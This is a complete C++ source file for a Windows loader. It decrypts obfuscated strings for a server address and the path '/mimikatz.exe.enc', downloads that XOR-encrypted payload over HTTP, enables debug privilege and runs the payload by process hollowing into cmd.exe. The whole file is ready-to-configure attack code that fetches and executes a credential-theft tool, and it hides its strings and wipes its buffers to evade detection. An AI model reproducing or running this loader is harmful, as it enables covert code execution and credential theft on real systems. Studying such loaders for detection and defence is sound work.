#include <windows.h>
#include <iostream>
#include <string>
#include <winhttp.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma warning(disable: 6387)

// ===================================================================
// ==================== USER CONFIGURATION ============================
// ===================================================================
// Change the values below to match your environment.
// -------------------------------------------------------------------

// 1. Remote server IP address (as a string, e.g., "192.168.0.161")
//    It is XOR-encrypted at compile time using the macros below.
//    To change the IP, modify the sequence of H_* macros in encIP[].
//    The current IP is: 192.168.0.161
//    Example: for "10.0.0.1", use H_1, H_0, H_dot, H_0, H_dot, H_0, H_dot, H_1

// 2. Remote server port (default: 80)
#define REMOTE_PORT 80

// 3. Payload file path on the server (e.g., "/mimikatz.exe.enc")
//    To change the filename, modify the sequence of H_* macros in encPath[].
//    The current path is: /mimikatz.exe.enc

// 4. XOR key used to encrypt the payload on the server (must match server-side)
//    The payload is XOR-encrypted with this key before being served.
#define PAYLOAD_XOR_KEY 0xBB

// 5. String obfuscation XOR key (used for obfuscating strings in the binary)
#define XOR_STR_KEY 0xAA

// ===================================================================
// ==================== END USER CONFIGURATION =======================
// ===================================================================

// ------------------------------------------------------------
// NT API definitions (unchanged)
// ------------------------------------------------------------
typedef LONG NTSTATUS;
#define ProcessBasicInformation 0

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

// ------------------------------------------------------------
// Full character macros for string obfuscation
// ------------------------------------------------------------
// Digits
#define H_0 '0'
#define H_1 '1'
#define H_2 '2'
#define H_3 '3'
#define H_4 '4'
#define H_5 '5'
#define H_6 '6'
#define H_7 '7'
#define H_8 '8'
#define H_9 '9'

// Lowercase letters
#define H_a 'a'
#define H_b 'b'
#define H_c 'c'
#define H_d 'd'
#define H_e 'e'
#define H_f 'f'
#define H_g 'g'
#define H_h 'h'
#define H_i 'i'
#define H_j 'j'
#define H_k 'k'
#define H_l 'l'
#define H_m 'm'
#define H_n 'n'
#define H_o 'o'
#define H_p 'p'
#define H_q 'q'
#define H_r 'r'
#define H_s 's'
#define H_t 't'
#define H_u 'u'
#define H_v 'v'
#define H_w 'w'
#define H_x 'x'
#define H_y 'y'
#define H_z 'z'

// Uppercase letters
#define H_A 'A'
#define H_B 'B'
#define H_C 'C'
#define H_D 'D'
#define H_E 'E'
#define H_F 'F'
#define H_G 'G'
#define H_H 'H'
#define H_I 'I'
#define H_J 'J'
#define H_K 'K'
#define H_L 'L'
#define H_M 'M'
#define H_N 'N'
#define H_O 'O'
#define H_P 'P'
#define H_Q 'Q'
#define H_R 'R'
#define H_S 'S'
#define H_T 'T'
#define H_U 'U'
#define H_V 'V'
#define H_W 'W'
#define H_X 'X'
#define H_Y 'Y'
#define H_Z 'Z'

// Special characters (printable)
#define H_space ' '
#define H_exclam '!'
#define H_quote '\"'
#define H_hash '#'
#define H_dollar '$'
#define H_percent '%'
#define H_amp '&'
#define H_apostrophe '\''
#define H_lparen '('
#define H_rparen ')'
#define H_asterisk '*'
#define H_plus '+'
#define H_comma ','
#define H_hyphen '-'
#define H_dot '.'
#define H_slash '/'
#define H_colon ':'
#define H_semicolon ';'
#define H_less '<'
#define H_equal '='
#define H_greater '>'
#define H_question '?'
#define H_at '@'
#define H_lbracket '['
#define H_backslash '\\'
#define H_rbracket ']'
#define H_caret '^'
#define H_underscore '_'
#define H_backtick '`'
#define H_lbrace '{'
#define H_pipe '|'
#define H_rbrace '}'
#define H_tilde '~'

// ------------------------------------------------------------
// Obfuscated path: "/mimikatz.exe.enc"
// ------------------------------------------------------------
unsigned char encPath[] = {
    H_slash ^ XOR_STR_KEY,
    H_m ^ XOR_STR_KEY,
    H_i ^ XOR_STR_KEY,
    H_m ^ XOR_STR_KEY,
    H_i ^ XOR_STR_KEY,
    H_k ^ XOR_STR_KEY,
    H_a ^ XOR_STR_KEY,
    H_t ^ XOR_STR_KEY,
    H_z ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_e ^ XOR_STR_KEY,
    H_x ^ XOR_STR_KEY,
    H_e ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_e ^ XOR_STR_KEY,
    H_n ^ XOR_STR_KEY,
    H_c ^ XOR_STR_KEY,
    0x00
};

// ------------------------------------------------------------
// Obfuscated IP: "192.168.0.161"
// ------------------------------------------------------------
unsigned char encIP[] = {
    H_1 ^ XOR_STR_KEY,
    H_9 ^ XOR_STR_KEY,
    H_2 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_1 ^ XOR_STR_KEY,
    H_6 ^ XOR_STR_KEY,
    H_8 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_0 ^ XOR_STR_KEY,
    H_dot ^ XOR_STR_KEY,
    H_1 ^ XOR_STR_KEY,
    H_6 ^ XOR_STR_KEY,
    H_1 ^ XOR_STR_KEY,
    0x00
};

void decrypt_string(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) {
        if (data[i] != 0) data[i] ^= key;
    }
}

std::wstring to_wide(const char* narrow) {
    int len = MultiByteToWideChar(CP_ACP, 0, narrow, -1, nullptr, 0);
    std::wstring wide(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, narrow, -1, &wide[0], len);
    return wide;
}

// ------------------------------------------------------------
// Enable SeDebugPrivilege
// ------------------------------------------------------------
bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        return false;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ret = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ret;
}

// ------------------------------------------------------------
// Process Hollowing
// ------------------------------------------------------------
bool RunPE(std::vector<BYTE>& payload, const std::wstring& targetProcess, BYTE xorKey) {
    std::wcout << L"[7] Creating suspended process: " << targetProcess << L"\n";
    DWORD creationFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE;
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(targetProcess.c_str(), NULL, NULL, NULL, FALSE,
        creationFlags, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] CreateProcess failed\n";
        return false;
    }
    std::wcout << L"[+] Process created with PID: " << pi.dwProcessId << L"\n";
    if (xorKey != 0) {
        std::cout << "[!] Decrypting payload with XOR key 0x" << std::hex << (int)xorKey << std::dec << "\n";
        for (size_t i = 0; i < payload.size(); ++i) {
            payload[i] ^= xorKey;
        }
    }
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] ntdll.dll not loaded\n";
        return false;
    }
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
        std::cerr << "[-] Failed to get NT functions\n";
        return false;
    }
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLen = 0;
    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);
    if (status != 0) {
        std::cerr << "[-] NtQueryInformationProcess failed (0x" << std::hex << status << std::dec << ")\n";
        return false;
    }
    if (pbi.PebBaseAddress == NULL) {
        std::cerr << "[-] Invalid PEB address\n";
        return false;
    }

    PEB peb = { 0 };
    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        std::cerr << "[-] ReadProcessMemory for PEB failed\n";
        return false;
    }

    PVOID oldBase = peb.Reserved3[1];
    std::cout << "[8] Unmapping original image at 0x" << std::hex << oldBase << std::dec << "\n";
    NtUnmapViewOfSection(pi.hProcess, oldBase);

    // Work on a mutable copy
    std::vector<BYTE> peCopy = payload;
    BYTE* pPeData = peCopy.data();

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pPeData;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pPeData + dosHeader->e_lfanew);

    // Keep subsystem as console (3) – cmd.exe expects it
    std::wcout << L"[!] Keeping subsystem as IMAGE_SUBSYSTEM_WINDOWS_CUI (console)\n";

    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD_PTR prefBase = ntHeaders->OptionalHeader.ImageBase;

    // Allocate remote memory
    PVOID remoteBase = VirtualAllocEx(pi.hProcess, (PVOID)prefBase,
        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        remoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            std::cerr << "[-] VirtualAllocEx failed\n";
            return false;
        }
        std::cout << "[9] Allocated at alternative address 0x" << std::hex << remoteBase << std::dec << "\n";
        DWORD_PTR delta = (DWORD_PTR)remoteBase - prefBase;
        if (delta != 0) {
            IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relocDir.Size > 0) {
                PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(pPeData + relocDir.VirtualAddress);
                while (reloc->VirtualAddress != 0) {
                    DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    WORD* items = (WORD*)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
                    for (DWORD i = 0; i < count; i++) {
                        if ((items[i] & 0xF000) == 0x3000) {
                            DWORD_PTR* patchAddr = (DWORD_PTR*)(pPeData + reloc->VirtualAddress + (items[i] & 0x0FFF));
                            *patchAddr += delta;
                        }
                    }
                    reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
                }
                std::cout << "[!] Applied relocations (delta = 0x" << std::hex << delta << std::dec << ")\n";
            }
            else {
                std::cerr << "[-] No relocation table, injection may fail\n";
                return false;
            }
        }
    }
    else {
        std::cout << "[9] Allocated at preferred address 0x" << std::hex << remoteBase << std::dec << "\n";
    }

    // Write PE headers and sections
    std::cout << "[10] Writing PE headers (size: " << ntHeaders->OptionalHeader.SizeOfHeaders << " bytes)\n";
    if (!WriteProcessMemory(pi.hProcess, remoteBase, pPeData, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        std::cerr << "[-] Write headers failed\n";
        return false;
    }

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    std::cout << "[11] Writing " << ntHeaders->FileHeader.NumberOfSections << " sections\n";
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PBYTE)remoteBase + section[i].VirtualAddress;
        if (section[i].SizeOfRawData > 0) {
            if (!WriteProcessMemory(pi.hProcess, dest, pPeData + section[i].PointerToRawData,
                section[i].SizeOfRawData, NULL)) {
                std::cerr << "[-] Write section " << i << " failed\n";
                return false;
            }
        }
    }

    // ---- Update PEB ImageBaseAddress ----
#ifdef _WIN64
    DWORD_PTR newBase = (DWORD_PTR)remoteBase;
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &newBase, sizeof(newBase), &written) || written != sizeof(newBase)) {
        std::cerr << "[-] Failed to update PEB ImageBaseAddress (x64 offset 0x10)\n";
        return false;
    }
#else
    DWORD newBase = (DWORD)remoteBase;
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x08, &newBase, sizeof(newBase), &written) || written != sizeof(newBase)) {
        std::cerr << "[-] Failed to update PEB ImageBaseAddress (x86 offset 0x08)\n";
        return false;
    }
#endif
    std::cout << "[✓] PEB ImageBaseAddress updated to 0x" << std::hex << remoteBase << std::dec << "\n";

    // ---- Set entry point directly ----
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] GetThreadContext failed\n";
        return false;
    }

    DWORD_PTR entryPoint = (DWORD_PTR)remoteBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#ifdef _WIN64
    ctx.Rip = entryPoint;
#else
    ctx.Eip = entryPoint;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] SetThreadContext failed\n";
        return false;
    }
    std::cout << "[12] Entry point set to 0x" << std::hex << entryPoint << std::dec << "\n";

    // ---- Zero out local buffers ----
    std::fill(payload.begin(), payload.end(), 0);
    std::fill(peCopy.begin(), peCopy.end(), 0);
    std::cout << "[✓] Local buffers zeroed\n";

    // ---- Resume ----
    std::cout << "[13] Resuming thread\n";
    ResumeThread(pi.hThread);

    Sleep(3000);
    DWORD exitCode = 0;
    GetExitCodeThread(pi.hThread, &exitCode);
    std::cout << "[+] Thread exit code: " << exitCode << " (259 = still running, 0 = success)\n";

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    std::cout << "[+] Execution finished.\n";
    return true;
}

// ------------------------------------------------------------
// Main
// ------------------------------------------------------------
int main() {
    if (!EnableDebugPrivilege()) {
        std::cerr << "[-] Could not enable SeDebugPrivilege. Run as Administrator.\n";
    }

    // Decrypt path and IP strings
    decrypt_string(encPath, sizeof(encPath), XOR_STR_KEY);
    decrypt_string(encIP, sizeof(encIP), XOR_STR_KEY);
    const char* path = reinterpret_cast<const char*>(encPath);
    const char* ip = reinterpret_cast<const char*>(encIP);
    std::cout << "[+] Path: " << path << "\n";
    std::cout << "[+] IP: " << ip << "\n";

    std::wstring wPath = to_wide(path);
    std::wstring wIP = to_wide(ip);

    // HTTP download using the configured IP and port
    std::cout << "[3] Initializing WinHTTP session...\n";
    HINTERNET session = WinHttpOpen(L"ResearchClient/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        std::cerr << "[-] WinHttpOpen failed\n";
        return 1;
    }
    std::cout << "[+] Session opened\n";

    std::cout << "[4] Connecting to " << ip << ":" << REMOTE_PORT << " ...\n";
    HINTERNET connection = WinHttpConnect(session, wIP.c_str(), REMOTE_PORT, 0);
    if (!connection) {
        std::cerr << "[-] WinHttpConnect failed\n";
        WinHttpCloseHandle(session);
        return 1;
    }
    std::cout << "[+] Connected\n";

    std::cout << "[5] Sending GET request for " << path << "\n";
    HINTERNET request = WinHttpOpenRequest(connection, L"GET", wPath.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!request) {
        std::cerr << "[-] WinHttpOpenRequest failed\n";
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return 1;
    }

    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0) ||
        !WinHttpReceiveResponse(request, nullptr)) {
        std::cerr << "[-] HTTP request failed\n";
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return 1;
    }

    std::cout << "[6] Downloading payload...\n";
    std::vector<BYTE> payload;
    DWORD available = 0;
    DWORD totalBytes = 0;
    while (WinHttpQueryDataAvailable(request, &available) && available > 0) {
        std::vector<BYTE> buffer(available);
        DWORD downloaded = 0;
        if (!WinHttpReadData(request, buffer.data(), available, &downloaded))
            break;
        payload.insert(payload.end(), buffer.begin(), buffer.begin() + downloaded);
        totalBytes += downloaded;
        std::cout << "\r    Downloaded " << totalBytes << " bytes" << std::flush;
    }
    std::cout << "\n[+] Retrieved " << payload.size() << " bytes total\n";

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    if (payload.empty()) {
        std::cerr << "[-] No data received\n";
        return 1;
    }

    // Target cmd.exe – works reliably (change if you prefer another process)
    std::wstring target = L"C:\\Windows\\System32\\cmd.exe";
    std::wcout << L"[7] Attempting process hollowing into " << target << L"\n";

    // Use the configured XOR key for payload decryption
    const BYTE PAYLOAD_XOR_KEY_LOCAL = PAYLOAD_XOR_KEY;

    if (!RunPE(payload, target, PAYLOAD_XOR_KEY_LOCAL)) {
        std::cerr << "[-] Process hollowing failed\n";
        return 1;
    }

    return 0;
}
